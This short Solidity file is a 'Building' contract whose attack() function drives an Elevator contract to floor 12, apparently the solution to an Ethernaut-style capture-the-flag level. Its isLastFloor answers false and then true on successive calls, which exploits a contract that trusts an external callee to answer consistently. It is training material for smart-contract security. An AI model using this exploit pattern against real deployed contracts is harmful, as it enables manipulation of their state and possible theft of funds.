// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "interfaces/IElevator.sol";

contract Building {
    bool firstCall;
    IElevator elevator;

    constructor(IElevator _elevator) public {
        firstCall = true;
        elevator = _elevator;
    }

    function attack() external {
        elevator.goTo(12);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            firstCall = true;
            return true;
        }
    }
}
